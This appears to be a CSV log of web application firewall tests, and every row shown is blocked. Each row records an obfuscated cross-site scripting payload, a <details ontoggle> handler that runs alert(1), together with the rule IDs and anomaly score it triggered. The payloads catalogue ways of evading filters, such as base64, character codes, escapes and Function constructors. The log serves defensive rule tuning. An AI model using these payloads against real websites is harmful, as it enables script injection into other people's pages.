1104,"<details open ontoggle='(new Function(`al${""er""}t(1)`))()'></details>",0,1,block,5,"932130,934100,941100,941120,949110","o40,5v217,69t:urlDecodeUni,t:cmdLine || o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603414814.286710
1105,"<details open ontoggle='(new Function(""al\u0065rt(1)""))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603414955.620295
1111,"<details open ontoggle='(new Function([""al"",""ert(1)""].join("""")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603415592.060592
1112,"<details open ontoggle='(new Function(""ale"".concat(""rt(1)"")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603415635.922109
1118,"<details open ontoggle='(new Function(""top[\""\\141\\154\\145\\162\\164\""](1)""))()'></details>",0,1,block,5,"934100,941100,941120,941370,949110","o25,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,34v217,93t:urlDecodeUni,t:compressWhitespace || ",20,177603416384.168331
1120,"<details open ontoggle='(new Function(""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o49,5v217,120 || o50,68v217,120 || o25,13v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603416597.096343
1121,"<details open ontoggle='(Function[""constructor""](""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,7,"932100,933160,933210,934100,941100,941120,949110","o60,5v217,131 || o61,68v217,131 || o24,105v217,131t:urlDecode,t:replaceComments,t:compressWhitespace || o61,5v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603416669.691966
1123,"<details open ontoggle='(window[""Function""](""var\x20a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941370,949110","o58,5v217,129 || o59,68v217,129 || o24,103v217,129t:urlDecode,t:replaceComments,t:compressWhitespace || o59,5v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,129t:urlDecodeUni,t:compressWhitespace || ",35,177603416813.862969
1124,"<details open ontoggle='(new Function(`var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))`))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o49,5v217,120 || o50,68v217,120 || o25,13v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603416930.989847
1125,"<details open ontoggle='(new Function(String.fromCharCode(118,97,114,32,97,61,98,116,111,97,59,101,118,97,108,40,97,116,111,98,40,97,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,44,52,48,44,52,57,44,52,49,41,41,41,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,309 || v217,309t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,309t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760341709.279509
1126,"<details open ontoggle='(new/**/Function(""var/**/a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o55,5v217,126 || o56,68v217,126 || o56,5v217,126 || v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603417185.751510
1130,"<details open ontoggle='(top[""Function""](""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941370,949110","o52,5v217,123 || o53,68v217,123 || o24,97v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o53,5v217,123 || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,123t:urlDecodeUni,t:compressWhitespace || ",35,177603417518.948003
1131,"<details open ontoggle='(new Function(""var a=atob;eval(a(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61)))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o49,5v217,127 || o50,75v217,127 || o25,13v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603417683.577868
1132,"<details open ontoggle='(new Function(atob(""dmFyIGE9YnRvYTtldmFsKGF0b2IoYShTdHJpbmcuZnJvbUNoYXJDb2RlKDk3LDEwOCwxMDEsMTE0LDExNiw0MCw0OSw0MSkpKSk="")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,152 || v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603417785.145036
1133,"<details open ontoggle='(new Function(""var\u0020a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o54,5v217,125 || o55,68v217,125 || o25,13v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603417824.076984
1135,"<details open ontoggle='(new Function(""var a=self.btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o54,5v217,125 || o55,68v217,125 || o25,13v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603418098.881670
1136,"<details open ontoggle='(new Function(""var a=window.btoa;eval(window.atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o56,5v217,134 || o57,75v217,134 || o25,13v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603418150.569543
1137,"<details open ontoggle='(new Function(""var a=btoa,b=atob,c=String.fromCharCode;eval(b(a(c(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o78,5v217,128 || o79,47v217,128 || o25,13v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603418259.888420
1139,"<details open ontoggle='(new self.Function(""var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))""))()'>",0,1,block,6,"932100,933160,934100,941100,941120,949110","o54,5v217,125 || o55,68v217,125 || o55,5v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603418424.436365
1140,"<details open ontoggle='(new Function(String[`fromCharCode`](97,108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603418554.129740
1142,"<details open ontoggle='(Function[""constructor""](""ale""+""rt(1)""))()'>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603418772.715716
1143,"<details open ontoggle='(new(Function)(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"933210,934100,941100,941120,949110","o24,67v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o39,19v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603418886.813190
1145,"<details open ontoggle='(new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603419017.648029
1147,"<details open ontoggle='(new Function(String[""fromCh""+""arCode""](97,108,101,114,116,40,49,41)))()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,72v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,98 || o25,13v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603419355.507455
1148,"<details open ontoggle='(new Function(atob(""YWxlcnQoMSk"")))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603419434.162428
1149,"<details open ontoggle='([][""constructor""][""constructor""](""ale""+""rt(1)""))()'>",0,1,block,4,"933210,941100,941120,949110","o24,51v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760341959.602350
1150,"<details open ontoggle='(new Function(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41)))()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,113 || o25,13v217,113t:urlDecodeUni || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603419693.810636
1151,"<details open ontoggle='(new Function(String[""from""+String.fromCharCode(67)+""harCode""](97,108,101,114,116,40,49,41)))()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,95v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,121 || o25,13v217,121t:urlDecodeUni || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603419741.661005
1153,"<details open ontoggle='(new Function(String.fromCharCode(parseInt(""61"",16),108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603419986.456331
1154,"<details open ontoggle='(new Function(String.fromCodePoint(97,108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603420069.364170
1156,"<details open ontoggle='(new Function(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41])))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603420261.243156
1157,"<details open ontoggle='(new Function(String.fromCharCode(...[97,108,101,114,116,40,49,41])))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603420354.791953
1158,"<details open ontoggle='(new Function(`${String.fromCharCode(97,108,101,114,116,40,49,41)}`))()'>",0,1,block,5,"932130,934100,941100,941120,949110","o38,51v217,97t:urlDecodeUni,t:cmdLine || o25,13v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603420463.581467
1159,"<details open ontoggle='(new Function(String[""\146\162\157\155\103\150\141\162\103\157\144\145""](97,108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603420582.241749
1161,"<details open ontoggle='(new Function(String[""fromCha""+""rCode""](97,108,101,114,116,40,49,41)))()'></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,72v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,108 || o25,13v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603420786.017253
1162,"<details open ontoggle='(new Function(atob(""YWxlcnQoMSk"")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603420837.446549
1166,"<details open ontoggle='(new Function(String.fromCodePoint(97,108,101,114,116,40,49,41)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603421269.782936
1167,"<details open ontoggle='(new Function(String[`fromCharCode`](97,108,101,114,116,40,49,41)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603421335.911822
1168,"<details open ontoggle='(new Function(""""[`constructor`][`fromCharCode`](97,108,101,114,116,40,49,41)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603421410.206838
1169,"<details open ontoggle='(new Function(decodeURIComponent(""%61%6c%65%72%74%28%31%29"")))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,100 || o25,13v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603421564.438007
1171,"<details open ontoggle='(new Function(decodeURI(""%61%6C%65%72%74%28%31%29"")))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,91 || o25,13v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603421876.759911
1172,"<details open ontoggle='(new Function(unescape(""%61%6c%65%72%74%28%31%29"")))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,90 || o25,13v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603421921.545997
1173,"<details open ontoggle='(new Function([...atob(""YWxlcnQoMSk"")].join("""")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603422069.149757
1174,"<details open ontoggle='(new Function(Array.from(atob(""YWxlcnQoMSk"")).join("""")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760342219.630157
1175,"<details open ontoggle='(new Function(eval(atob(""YXRvYigiWVd4bGNuUW9NU2s9Iik=""))))()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o38,46v217,96 || o25,13v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603422269.168305
1176,"<details open ontoggle='(new Function(String[""fromCharCode""][""call""](null,97,108,101,114,116,40,49,41)))()'></details>",0,1,block,5,"933210,934100,941100,941120,949110","o24,82v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603422377.877551
1177,"<details open ontoggle='(new Function(String[""fromCharCode""][""apply""](null,[97,108,101,114,116,40,49,41])))()'></details>",0,1,block,5,"933210,934100,941100,941120,949110","o24,85v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603422444.980595
1178,"<details open ontoggle='(new Function(eval(String.fromCharCode(83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,44,52,48,44,52,57,44,52,49,41))))()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o38,188v217,238 || o25,13v217,238 || v217,238t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,238t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603422561.397754
1179,"<details open ontoggle='(new Function(String[""\146\162\157\155\103\150\141\162\103\157\144\145""](97,108,101,114,116,40,49,41)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760342261.019976
1180,"<details open ontoggle='(new Function(""\u0061\u006c\u0065\u0072\u0074(1)""))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760342272.957394
1181,"<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603422843.434231
1182,"<details open ontoggle='(new Function([""\u0061\u006c\u0065\u0072\u0074(1)""][0]))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603422993.600235
1183,"<details open ontoggle='(new(Function)(""\u0061\u006c\u0065\u0072\u0074(1)""))()'>",0,1,block,4,"933210,941100,941120,949110","o24,54v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760342305.783827
1185,"<details open ontoggle='(new Function(""\u0061\u006c""+""\u0065\u0072\u0074(1)""))()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,82 || o25,13v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603423243.978182
1186,<details open ontoggle='(new Function(`\u0061\u006c\u0065\u0072\u0074(1)`))()'>,0,1,block,4,"934100,941100,941120,949110","o25,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603423374.570462
1189,"<details open ontoggle='(new Function(String[""fromCharCode""](97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"933210,934100,941100,941120,949110","o24,69v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603423647.721791
1190,"<details open ontoggle='(new Function(""\u0061""+""l""+""e""+""r""+""t""+""(1)""))()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,74 || o25,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603423747.319012
1193,"<details open ontoggle='(new Function(""\141\154\145\162\164(1)""))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603424087.563871
1195,"<details open ontoggle='(new Function(""\u{61}\u{6c}\u{65}\u{72}\u{74}(1)""))()'>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603424367.964608
1196,"<details open ontoggle='(new Function(decodeURI(""%61%6C%65%72%74(1)"")))()'>",0,1,block,6,"934100,934100,941100,941120,942100,949110","o25,13v217,75 || o25,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,75 || ",25,17760342446.716168
